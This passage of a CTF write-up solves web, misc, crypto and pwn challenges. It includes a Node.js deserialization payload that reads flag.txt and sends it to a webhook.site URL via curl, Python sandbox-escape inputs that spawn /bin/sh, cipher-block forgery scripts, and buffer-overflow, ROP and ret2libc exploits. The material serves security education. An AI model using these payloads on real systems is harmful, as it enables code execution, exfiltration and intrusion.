&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>unserialize allow us to execute arbitray javascript code in Node.</p>
<p>So, use this payload and encode it into base64. send this payload to &#x2F;secret. We will get the flag.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;cereal&quot;:&quot;_$$ND_FUNC$$_function ()&#123;var ff=\&quot;ggg\&quot;;require(\&quot;child_process\&quot;).exec(\&quot;cat flag.txt\&quot;,function puts(error, stdout, stderr) &#123;require(\&quot;child_process\&quot;).exec(\&quot;curl https://webhook.site/7b7b96e8-2831-41da-8997-b7c55b4f75ca?flag=\&quot;+stdout+stderr)&#125;);return ff;&#125;()&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>flag</strong>: maple{0H_w41t_you_meant_ser1al_not_cer3al?}</p>
<h1 id="0x4-Misc"><a href="#0x4-Misc" class="headerlink" title="0x4 Misc"></a>0x4 Misc</h1><p>misc question didn&#39;t have much too say, it involve lots of guess work. </p>
<hr>
<h2 id="CTF-Adventure-Land-1"><a href="#CTF-Adventure-Land-1" class="headerlink" title="CTF Adventure Land 1"></a>CTF Adventure Land 1</h2><p>there is a png called map.png, use red plane to review the flag</p>
<p><img data-src="/./uploads/map.png" alt="map.png"><img data-src="/./uploads/2022-01-28_233112.jpg" alt="2022-01-28_233112.jpg"></p>
<p><strong>flag</strong>: maple{w3lc0m3_70_m4pl3_b4c0n_4dv3n7ur3_l4nd}</p>
<hr>
<h2 id="Cutoff"><a href="#Cutoff" class="headerlink" title="Cutoff"></a>Cutoff</h2><p>this question is also simple, given a image with height 1267, but the actually height is 1400. So, edit PNG header, make the height back to 1400 to get the full flag.</p>
<p><strong>flag</strong>: maple{very_l0NG_PnG}</p>
<hr>
<h2 id="What-Is-A-Word"><a href="#What-Is-A-Word" class="headerlink" title="What Is A Word"></a>What Is A Word</h2><p>unzip the .docx file and get the flag in image2.png</p>
<p><strong>flag</strong>: maple{a_w0rd_on3_z1p!}</p>
<hr>
<h2 id="Pyjail"><a href="#Pyjail" class="headerlink" title="Pyjail"></a>Pyjail</h2><p>Pyjail are actually a series similar challenge with different black list.</p>
<p>server.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def main():</span><br><span class="line">    userinput = input(&#x27;&gt;&gt; &#x27;)</span><br><span class="line">    if len(userinput) &gt; 50:</span><br><span class="line">        raise Exception()</span><br><span class="line">    </span><br><span class="line">    # for pyjail 1</span><br><span class="line">    blacklist = [&#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;rm&#x27;, &#x27;kill&#x27;, &#x27;+&#x27;]</span><br><span class="line">    # for pyjail 2</span><br><span class="line">    blacklist = [&#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;import&#x27;, &#x27;os&#x27;, &#x27;=&#x27;, &#x27;txt&#x27;, &#x27;read&#x27;, &#x27;dict&#x27;, &#x27;;&#x27;, &#x27;:&#x27;, &#x27;\n&#x27;, &#x27;flag&#x27;, &#x27;subprocess&#x27;, &#x27;write&#x27;, &#x27;input&#x27;, &#x27;_&#x27;]</span><br><span class="line">    # for pyjail 3</span><br><span class="line">    blacklist = [&#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;import&#x27;, &#x27;os&#x27;, &#x27;=&#x27;, &#x27;txt&#x27;, &#x27;read&#x27;, &#x27;dict&#x27;, &#x27;;&#x27;, &#x27;:&#x27;, &#x27;\n&#x27;, &#x27;flag&#x27;, &#x27;subprocess&#x27;, &#x27;write&#x27;, &#x27;input&#x27;, &#x27;_&#x27;, &#x27;getattr&#x27;, &#x27;globals&#x27;, &#x27;update&#x27;]</span><br><span class="line"></span><br><span class="line">    for illegal in blacklist:</span><br><span class="line">        if illegal in userinput.lower():</span><br><span class="line">            print(&quot;Illegal Char: &quot; + illegal)</span><br><span class="line">            print(&quot;Goodbye :)&quot;)</span><br><span class="line">            raise Exception()</span><br><span class="line">    else:</span><br><span class="line">        exec(userinput)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>There is three intended solution for each of the qeustion, however there is also unintended solution</p>
<h3 id="Intended-solution"><a href="#Intended-solution" class="headerlink" title="Intended solution"></a>Intended solution</h3><p>Pyjail 1: <code>__builtins__.__dict__[&#39;__import__&#39;](&#39;os&#39;).__dict__[&#39;system&#39;](&#39;ls&#39;)</code></p>
<p>Pyjail 2&amp;3: <code>print([l.strip() for l in open(&quot;f&quot;+&quot;lag.tx&quot;+&quot;t&quot;)])</code></p>
<h3 id="Unintended-solution"><a href="#Unintended-solution" class="headerlink" title="Unintended solution"></a>Unintended solution</h3><p>enter <code>breakpoint()</code>, this will lead to you into a python console, then you can do what ever you want. For example, use <code>import os;os.system(&quot;/bin/sh&quot;)</code> to spawn a shell.</p>
<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><ul>
<li>maple{welc0m3_to_the_w0rlD_oF_cod3_j4ilz}</li>
<li>maple{pyth0n_0n3_lInerz_UwU}</li>
<li>maple{Did_u_kn0w_that_d0lph1ns_sl33p_with_one_eye_open}</li>
</ul>
<hr>
<h2 id="Hijacked"><a href="#Hijacked" class="headerlink" title="Hijacked"></a>Hijacked</h2><p>the problem give you an <code>wireshark.pcap</code> file. Load this file into wireshark. You will find 4 suspicious http request. 4 http request contains a list of three number. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">49.26391,-123.21524,94.38</span><br><span class="line">49.26392,-123.21460,94.09</span><br><span class="line">49.26390,-123.21343,92.47</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>looks very like latitude and longtitude, so put all the number into an excel and draw the graph (and horizontal flip) to get the flag</p>
<p><img data-src="/./uploads/hijacked.png" alt="hijacked.png"></p>
<p><strong>flag</strong>: MapLE{misc_bacon_from_outer_space}</p>
<h1 id="0x5-Crypto"><a href="#0x5-Crypto" class="headerlink" title="0x5 Crypto"></a>0x5 Crypto</h1><p>honestly, I have no idea how crypto works before this ctf. This ctf kind of give me an expression about how crypto looks like.</p>
<hr>
<h2 id="Factor-Me"><a href="#Factor-Me" class="headerlink" title="Factor Me"></a>Factor Me</h2><p>a very typical RSA problem, use factordb to get p,q. And then decrypt the message</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># https://en.wikipedia.org/wiki/RSA_(cryptosystem)</span><br><span class="line">from Crypto.Util.number import bytes_to_long, getPrime, inverse,long_to_bytes</span><br><span class="line"></span><br><span class="line">p = 773368062113</span><br><span class="line">q = 827811871697</span><br><span class="line"></span><br><span class="line">N= 640203263008444282715761</span><br><span class="line">e= 65537</span><br><span class="line">ciphertext= 400260416204680499515181</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">print(pow(ciphertext, d, N))</span><br><span class="line">print(long_to_bytes(pow(ciphertext, d, N)))</span><br></pre></td></tr></table></figure>

<p><strong>flag</strong>: maple{f@cTor!ng}</p>
<hr>
<h2 id="Too-Large-to-Factor"><a href="#Too-Large-to-Factor" class="headerlink" title="Too Large to Factor"></a>Too Large to Factor</h2><p>according to goole, it is related to <strong>e &#x3D; 3</strong>, but i don&#39;t how it works, so i just copy paste a script from internet and get the flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import bytes_to_long, getPrime, inverse,long_to_bytes</span><br><span class="line"></span><br><span class="line">n = 85296113154028266649672161860329361439935266228905629388726013424103003229818805929348250297726228216361916145120272570744501496079735410949226284857146260962752588479499367910582240029329267295901611756016118582770290309132799890905930226231742595748717830957810354752447792103653956003395218828964428421661</span><br><span class="line">e = 3</span><br><span class="line">cipher_str = 121098269316542670291503874251201317814247329243208799383594138766421611605510707696480316724191110125699109139761891217594094151254743752917029528490060357300730222261644995695658612386816700954494942529833311406855562210279835749</span><br><span class="line"></span><br><span class="line">gs = gmpy2.mpz(cipher_str)</span><br><span class="line">gm = gmpy2.mpz(n)</span><br><span class="line">ge = gmpy2.mpz(e)</span><br><span class="line"></span><br><span class="line">root, exact = gmpy2.iroot(gs, ge)</span><br><span class="line">print(long_to_bytes(root))</span><br></pre></td></tr></table></figure>

<p><strong>flag</strong>: maple{d0n7_f0rg37_y0ur_p4dd1n9!}</p>
<hr>
<h2 id="Copilot-my-savior"><a href="#Copilot-my-savior" class="headerlink" title="Copilot my savior"></a>Copilot my savior</h2><p>the encryption is pretty simple, xor all the bytes with a key, which is one byte.</p>
<p>So for decryption, just iterate all the possible one byte (from 0 to 255).</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Thanks copilot!</span><br><span class="line">def encrypt(file, key):</span><br><span class="line">    f = open(file, &quot;r&quot;)</span><br><span class="line">    f_out =open(file + &quot;.enc&quot;, &quot;w&quot;)</span><br><span class="line">    for line in f:</span><br><span class="line">        for c in line:</span><br><span class="line">            f_out.write(chr(ord(c) ^ key))</span><br><span class="line">    f.close()</span><br><span class="line">    f_out.close()</span><br><span class="line"></span><br><span class="line">def decrypt(file):</span><br><span class="line">    content = &quot;&quot;</span><br><span class="line">    with open(file, &quot;r&quot;) as f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    print(len(content))</span><br><span class="line">    for key in range(256):</span><br><span class="line">        for c in content:</span><br><span class="line">            print(chr(ord(c) ^ key),end=&quot;&quot;)</span><br><span class="line">        print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># encrypt(&quot;flag.txt&quot;, key)</span><br><span class="line">decrypt(&quot;flag.txt.enc&quot;)</span><br></pre></td></tr></table></figure>

<p><strong>flag</strong>: maple{c0P1L07_b37R4Y3D_m3}</p>
<hr>
<h2 id="Blindfolded"><a href="#Blindfolded" class="headerlink" title="Blindfolded"></a>Blindfolded</h2><p>this is a quite interesting problem. </p>
<p>There is very important rule here</p>
<p>a % N + -a % N &#x3D;&#x3D; N</p>
<p>so to get N, we can use (-1)^65537 &#x3D; -1, therefore, N should be (-1 % N) + (1 % N), therefore, we can use -1 to get N from the server</p>
<p>and since the server only check for flag not -flag, we can let server to decrypt -flag for us</p>
<p>and the flag should be N + (-flag)</p>
<p>server.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import getPrime, bytes_to_long, inverse</span><br><span class="line">flag = b&quot;123123&quot;</span><br><span class="line"></span><br><span class="line">def encrypt(msg):</span><br><span class="line">	return pow(msg, e, N)</span><br><span class="line"></span><br><span class="line">def decrypt(msg):</span><br><span class="line">	return pow(msg, d, N)</span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = getPrime(512)</span><br><span class="line">N = p * q</span><br><span class="line">print(N)</span><br><span class="line">print(p)</span><br><span class="line">print(q)</span><br><span class="line">e = 65537</span><br><span class="line"></span><br><span class="line">phi = (p - 1) * (q - 1)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">print(d)</span><br><span class="line">encrypted_flag = encrypt(flag)</span><br><span class="line"></span><br><span class="line"># Check that decryption works properly</span><br><span class="line">assert(decrypt(encrypted_flag) == flag)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">	while True:</span><br><span class="line">		try:</span><br><span class="line">			print(&quot;&quot;&quot;Here are your options:\n1) Encrypt a message\n2) Decrypt a message\n3) Get the encrypted flag&quot;&quot;&quot;)</span><br><span class="line">			option = int(input(&quot;&gt;&gt;&gt; &quot;))</span><br><span class="line">			if option == 1:</span><br><span class="line">				msg = int(input(&quot;&gt;&gt;&gt; &quot;))</span><br><span class="line">				print(encrypt(msg))</span><br><span class="line">			elif option == 2:</span><br><span class="line">				msg = int(input(&quot;&gt;&gt;&gt; &quot;))</span><br><span class="line">				if msg == encrypted_flag:</span><br><span class="line">					print(&quot;No cheating!&quot;)</span><br><span class="line">				else:</span><br><span class="line">					print(decrypt(msg))</span><br><span class="line">			elif option == 3:</span><br><span class="line">				print(encrypted_flag)</span><br><span class="line">		except ValueError:</span><br><span class="line">			print(&quot;Something unexpected happened, please try again!&quot;)</span><br></pre></td></tr></table></figure>

<p><strong>flag</strong>: maple{d0nt_f0rg37_t0_h@sh!!}</p>
<hr>
<h2 id="Cut-and-paste"><a href="#Cut-and-paste" class="headerlink" title="Cut and paste"></a>Cut and paste</h2><p>looking at <a href="./uploads/cutandpaste_server.py">server.py</a>. I realize, i need to construct a payload with <code>admin:true</code>. But server ban <strong>admin</strong>, <strong>:</strong>, and <strong>,</strong>.</p>
<p>But since the server encrypt data 1 block by 1 block. We can combine two different block together to get the correct payload</p>
<p>so first use <code>user:AAAAAAAA,admin:false,passwd:true</code> and get last block which represent <code>:true</code></p>
<p>Then, use <code>user:AAAAA,admin:false,passwd:true</code> and get first block which represent <code>user:AAAAA,admin</code></p>
<p>finally, combine those two block and send back to server, which should be the encryption of <code>user:AAAAA,admin:true</code>. This satisfy the rule and give us the flag.</p>
<hr>
<h2 id="One-two-three"><a href="#One-two-three" class="headerlink" title="One two three"></a>One two three</h2><p>idk how to explain. please check out this <a href="https://ubcctf.github.io/2021/08/beginner-crypto/">tutorial</a></p>
<p>here is my solution</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lines = []</span><br><span class="line"></span><br><span class="line">def score(result):</span><br><span class="line">    score = 0</span><br><span class="line">    for b in result:</span><br><span class="line">        if ord(&quot;A&quot;) &lt;=b &lt;= ord(&quot;Z&quot;) or ord(&quot;a&quot;) &lt;= b &lt;= ord(&quot;z&quot;):</span><br><span class="line">            score += 6</span><br><span class="line">            continue</span><br><span class="line">        if b == 32:</span><br><span class="line">            score += 5</span><br><span class="line">            continue</span><br><span class="line">        if 33 &lt;=b &lt;= 47:</span><br><span class="line">            score += 1</span><br><span class="line">            continue</span><br><span class="line">        if b&lt;= 31:</span><br><span class="line">            score -= 2</span><br><span class="line">        if b &gt; 127:</span><br><span class="line">            score -= 8</span><br><span class="line">    return score</span><br><span class="line"></span><br><span class="line">with open(&quot;secret.enc&quot;, &quot;r&quot;) as f:</span><br><span class="line">    lines = [bytes.fromhex(line.strip()) for line in f.readlines()]</span><br><span class="line"></span><br><span class="line">possible_key_bytes = [i for i in range(256)]</span><br><span class="line">max_score_key = [0 for i in range(128)]</span><br><span class="line"></span><br><span class="line">for key_index in range(128):</span><br><span class="line">    maxscore = -10000000</span><br><span class="line">    for key in possible_key_bytes:</span><br><span class="line">        encoded_bytes = [b[key_index] for b in lines if key_index &lt; len(b)]</span><br><span class="line">        s = score([x ^ key for x in encoded_bytes])</span><br><span class="line">        if s &gt; maxscore:</span><br><span class="line">            maxscore = s</span><br><span class="line">            max_score_key[key_index] = key</span><br><span class="line"></span><br><span class="line">for line in lines:</span><br><span class="line">    ba = bytearray(line)</span><br><span class="line">    key_index = 0</span><br><span class="line">    for i in range(len(ba)):</span><br><span class="line">        ba[i] = ba[i]^max_score_key[key_index]</span><br><span class="line">        key_index +=1</span><br><span class="line">    print(ba)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Propagation"><a href="#Propagation" class="headerlink" title="Propagation"></a>Propagation</h2><p>similar to cut and paste <a href="./uploads/propagation_server.py">server.py</a>, but instead of encrypt message block by block using same key. it xor with the previous block before encryption. This is a technique called <strong>Block chaining</strong></p>
<p>the main idea here is since it allow us to enter IV, we can make our own string <code>AA:AA,admin:true</code> and xor it with it self, which result in <code>\x00 * 16</code>. </p>
<p>once we send our payload to server, server will return the encryption, which is block[2] &#x3D; <code>encrypt(&quot;AA:AA,admin:true&quot;^&quot;AA:AA,admin:true&quot;^block[1])</code></p>
<p>so, if we send <code>encrypt(&quot;AA:AA,admin:true&quot;^&quot;AA:AA,admin:true&quot;^block[1])</code> to the server with IV of <code>&quot;AA:AA,admin:true&quot;^block[1]</code>.</p>
<p>The server will decrypt our payload by <code>decrypt(encrypt(&quot;AA:AA,admin:true&quot;^&quot;AA:AA,admin:true&quot;^block[1])) ^ &quot;AA:AA,admin:true&quot;^block[1] </code> </p>
<p>which is <code>&quot;AA:AA,admin:true&quot;^&quot;AA:AA,admin:true&quot;^block[1] ^ &quot;AA:AA,admin:true&quot;^block[1]</code> &#x3D;&#x3D; <code>&quot;AA:AA,admin:true&quot;</code>. </p>
<p>And therefore, we bypass the check.</p>
<p>here is my solution</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import os</span><br><span class="line"># context.log_level = &#x27;debug&#x27; # uncomment to enable debugging</span><br><span class="line"># r = remote(&#x27;localhost&#x27;, 1337)</span><br><span class="line">r = remote(&#x27;challenges.ctf.maplebacon.org&#x27;, 32002)</span><br><span class="line"></span><br><span class="line">def register_user(username, password):</span><br><span class="line">    print(f&quot;[Client] Registering user: &#123;username&#125; | passwd: &#123;password&#125;&quot;)</span><br><span class="line">    r.sendline(b&quot;1&quot;)</span><br><span class="line">    r.recvuntil(b&quot;Input your username:&quot;)</span><br><span class="line">    r.sendline(username)</span><br><span class="line">    r.recvuntil(b&quot;Input your password:&quot;)</span><br><span class="line">    r.sendline(password)</span><br><span class="line">    debug_stuff = r.recvuntil(b&quot;Here&#x27;s&quot;).decode()</span><br><span class="line">    for line in debug_stuff.split(&quot;\n&quot;)[:-1]:</span><br><span class="line">        print(line)</span><br><span class="line"></span><br><span class="line">    r.recvuntil(b&quot;when we add the login feature: &quot;)</span><br><span class="line">    token = r.recvline().decode()</span><br><span class="line">    ctxt, iv = token.split(&quot;,&quot;)</span><br><span class="line">    r.recvuntil(b&quot;&gt;&quot;)</span><br><span class="line">    return ctxt, iv</span><br><span class="line"></span><br><span class="line">def admin_login(ctxt, iv):</span><br><span class="line">    token = ctxt + &quot;,&quot; + iv</span><br><span class="line">    print(&quot;[Client] Attempting login&quot;)</span><br><span class="line">    r.sendline(b&quot;2&quot;)</span><br><span class="line">    r.recvuntil(b&quot;token: &quot;)</span><br><span class="line">    r.sendline(token.encode())</span><br><span class="line">    debug_stuff = r.recvuntil(b&quot;Wel&quot;).decode()</span><br><span class="line">    for line in debug_stuff.split(&quot;\n&quot;)[:-1]:</span><br><span class="line">        print(line)</span><br><span class="line"></span><br><span class="line">    r.recvuntil(b&quot;&gt;&quot;)</span><br><span class="line"></span><br><span class="line">def xor(a,b):</span><br><span class="line">    assert len(a) == len(b)</span><br><span class="line">    return bytes([x ^ y for x,y in zip(a,b)])</span><br><span class="line"></span><br><span class="line">def xor_hex(a,b):</span><br><span class="line">    a,b = bytes.fromhex(a),bytes.fromhex(b)</span><br><span class="line">    return bytes([x ^ y for x,y in zip(a,b)]).hex()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Y encrypt</span><br><span class="line"># user:AAAAAAA,adm | in:false,passwd: | AA:AA,admin:true</span><br><span class="line"># Y[2] = en(&quot;AAAAA,admin:true&quot;^X[1]^N)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mask = b&#x27;AA:AA,admin:true&#x27;</span><br><span class="line">payload1 = b&quot;AAAAAAA&quot;</span><br><span class="line">payload2 = b&#x27;AA:AA,admin:true&#x27;</span><br><span class="line">ctxt,iv = register_user(payload1,xor(payload2,mask))</span><br><span class="line">admin_login(ctxt[32*2:32*3],xor_hex(ctxt[32*1:32*2],mask.hex()))</span><br></pre></td></tr></table></figure>

<h1 id="0x6-PWN"><a href="#0x6-PWN" class="headerlink" title="0x6 PWN"></a>0x6 PWN</h1><h2 id="memowy-cowwuption"><a href="#memowy-cowwuption" class="headerlink" title="memowy cowwuption"></a>memowy cowwuption</h2><p>the exploits is very straight forward, fgets() will cause an overflow. So we can just overwrite id.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void vuln() &#123;</span><br><span class="line">    char* name = malloc(64);</span><br><span class="line">    int* id = malloc(sizeof(int));</span><br><span class="line"></span><br><span class="line">    puts(&quot;Hello, what is your name?&quot;);</span><br><span class="line"></span><br><span class="line">    fgets(name, 0x64, stdin);</span><br><span class="line"></span><br><span class="line">    for (int i = 0; i &lt; 64; i++) &#123;</span><br><span class="line">        if (name[i] == &#x27;\n&#x27;) &#123;</span><br><span class="line">            name[i] = &#x27;\0&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (*id == ADMIN_ID) &#123;</span><br><span class="line">        win();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        printf(&quot;Sorry %s, your ID (%x) does not match the admin ID (%x)\n&quot;, name, *id, ADMIN_ID);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp.py </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">payload = flat(&#123;</span><br><span class="line">    # 0x38: 0,</span><br><span class="line">    0x50: 0xdeadbeef,</span><br><span class="line">&#125;,filler=b&#x27;A&#x27;,length=0x64)</span><br><span class="line"></span><br><span class="line">io.sendafter(b&quot;Hello, what is your name?\n&quot;,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>flag</strong>: maple{ovewwwiting_stack_vawiabwes}</p>
<hr>
<h2 id="wetuwn-addwess"><a href="#wetuwn-addwess" class="headerlink" title="wetuwn addwess"></a>wetuwn addwess</h2><p>check binary, No PIE enabled. So just overwrite RIP to win to get the flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void win() &#123;</span><br><span class="line">    puts(flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    alarm(60);</span><br><span class="line">    setbuf(stdout, NULL);</span><br><span class="line">    setbuf(stdin, NULL);</span><br><span class="line"></span><br><span class="line">    char name[32];</span><br><span class="line"></span><br><span class="line">    FILE* flagfile = fopen(&quot;flag.txt&quot;, &quot;r&quot;);</span><br><span class="line"></span><br><span class="line">    if (flagfile == NULL) &#123;</span><br><span class="line">        puts(&quot;Error: could not read flag file&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fgets(flag, FLAG_LEN, flagfile);</span><br><span class="line"></span><br><span class="line">    puts(&quot;What&#x27;s your name?&quot;);</span><br><span class="line">    gets(name);</span><br><span class="line">    printf(&quot;Hello %s! Let&#x27;s go to %p\n&quot;, name, __builtin_return_address(0));</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">stack = flat(&#123;</span><br><span class="line">    0x30+8: 0x00401216,</span><br><span class="line">&#125;,filler=b&#x27;\x00&#x27;,length=0x40)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;What&#x27;s your name?&quot;, stack)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>flag</strong>: maple{r3turn_t0_w1n}</p>
<hr>
<h2 id="wetuwn-owiented-pwogwamming"><a href="#wetuwn-owiented-pwogwamming" class="headerlink" title="wetuwn owiented pwogwamming"></a>wetuwn owiented pwogwamming</h2><p>change vuln with corresponding rop chain</p>
<ol>
<li>ret - just want to ret</li>
<li>A() - make uwu &#x3D; true</li>
<li>B() - make owo &#x3D; true</li>
<li>pop rdi,ret - put 0xdeadbeef into first parameter of the function</li>
<li>0xdeadbeef</li>
<li>C() - call A(0xdeadbeef) to make rawrxd &#x3D; true</li>
<li>win() - get the flag</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char flag[FLAG_LEN];</span><br><span class="line">bool rawrxd = false;</span><br><span class="line">bool uwu = false;</span><br><span class="line">bool owo = false;</span><br><span class="line"></span><br><span class="line">void win() &#123;</span><br><span class="line">    // print flag</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void A() &#123;</span><br><span class="line">    uwu = true;</span><br><span class="line">    puts(&quot;uwu&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void B() &#123;</span><br><span class="line">    if (uwu) &#123;</span><br><span class="line">        owo = true;</span><br><span class="line">        puts(&quot;owo&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void C(int secwet) &#123;</span><br><span class="line">    if (secwet == 0xdeadbeef) &#123;</span><br><span class="line">        rawrxd = true;</span><br><span class="line">        puts(&quot;rawrxd&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void vuln() &#123;</span><br><span class="line">    char input[100];</span><br><span class="line"></span><br><span class="line">    puts(&quot;uwu owo rawrxd&quot;);</span><br><span class="line">    fgets(input, 0x100, stdin);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    alarm(60);</span><br><span class="line">    setbuf(stdout, NULL);</span><br><span class="line">    setbuf(stdin, NULL);</span><br><span class="line"></span><br><span class="line">    vuln();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>my exp.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">ret_addr = exe_rop.find_gadget([&#x27;ret&#x27;])[0]</span><br><span class="line">pop_rdi_ret_addr = exe_rop.find_gadget([&#x27;pop rdi&#x27;, &#x27;ret&#x27;])[0]</span><br><span class="line"></span><br><span class="line">stack = flat(&#123;</span><br><span class="line">    0x70+8: [</span><br><span class="line">        ret_addr,</span><br><span class="line">        exe.sym[&quot;A&quot;],</span><br><span class="line">        exe.sym[&quot;B&quot;],</span><br><span class="line">        pop_rdi_ret_addr,</span><br><span class="line">        0xdeadbeef,</span><br><span class="line">        exe.sym[&quot;C&quot;],</span><br><span class="line">        exe.sym[&quot;win&quot;],</span><br><span class="line">    ],</span><br><span class="line">&#125;,filler=b&#x27;\x00&#x27;,length=0x100)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;uwu owo rawrxd&quot;, stack)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="wetuwn-to-wibc"><a href="#wetuwn-to-wibc" class="headerlink" title="wetuwn to wibc"></a>wetuwn to wibc</h2><p>this is a very classic <strong>ret-2-libc</strong> question. If you want to see more about ret2libc, check out this <a href="/2021/10/09/ductf2021-pwn-oversight/">oversight</a> challenge</p>
<p>first, lets check mitigations. We can see all the protection has enabled. including canary. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#    Arch:     amd64-64-little</span><br><span class="line">#    RELRO:    Full RELRO</span><br><span class="line">#    Stack:    Canary found</span><br><span class="line">#    NX:       NX enabled</span><br><span class="line">#    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>lets take look at the <a href="./uploads/wetuwn-to-wibc.c">source code</a>.</p>
<p>There is a very trivial bug here, is it didn&#39;t check for the upper bound. So, we can leak canary here. </p>
<p>Moreover, after getting the canary value, we can just use <code>gets</code> to overwrite the whole stack.</p>
<p>Since we take control of the whole stack, we just write the canary using the canary value we get from previous step</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (input &gt;= 0 &amp;&amp; input &lt; sizeof uwus) &#123;</span><br><span class="line">    printf(&quot;This UwU&#x27;er has UwU&#x27;ed %llu times!\n&quot;, uwus[input]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    puts(&quot;Error: index out of bounds.&quot;);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">gets(comment);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>part of exp.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;Index: &quot;, b&quot;47&quot;)</span><br><span class="line">io.recvuntil(b&quot;This UwU&#x27;er has UwU&#x27;ed &quot;)</span><br><span class="line">libc.address = int(io.recvuntil(b&quot; times!\n&quot;, drop=True)) - libc.libc_start_main_return</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;Index: &quot;, b&quot;43&quot;)</span><br><span class="line">io.recvuntil(b&quot;This UwU&#x27;er has UwU&#x27;ed &quot;)</span><br><span class="line">canary = int(io.recvuntil(b&quot; times!\n&quot;, drop=True))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;Index: &quot;, b&quot;-1&quot;)</span><br><span class="line"></span><br><span class="line">rop = ROP(libc)</span><br><span class="line"></span><br><span class="line">payload = flat(&#123;</span><br><span class="line">    0x108: canary,</span><br><span class="line">    0x110 + 0x8: [</span><br><span class="line">        rop.find_gadget([&quot;ret&quot;])[0],</span><br><span class="line">        rop.find_gadget([&quot;pop rdi&quot;, &quot;ret&quot;])[0],</span><br><span class="line">        next(libc.search(b&quot;/bin/sh\x00&quot;)),</span><br><span class="line">        libc.sym[&#x27;system&#x27;],</span><br><span class="line">        ],</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;Thanks for using my UwU Counter! What did you think?\n&quot;, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>flag</strong>: maple{f1y_m3_t0_th3_m00n_4nd_l3t_m3_pl4y_am0ngu5}</p>
<h2 id="uwu-intewpwetew"><a href="#uwu-intewpwetew" class="headerlink" title="uwu intewpwetew"></a>uwu intewpwetew</h2><p>a very fun problem. it implement a buggy interpreter of uwu language - <a href="https://esolangs.org/wiki/UwU">uwu</a></p>
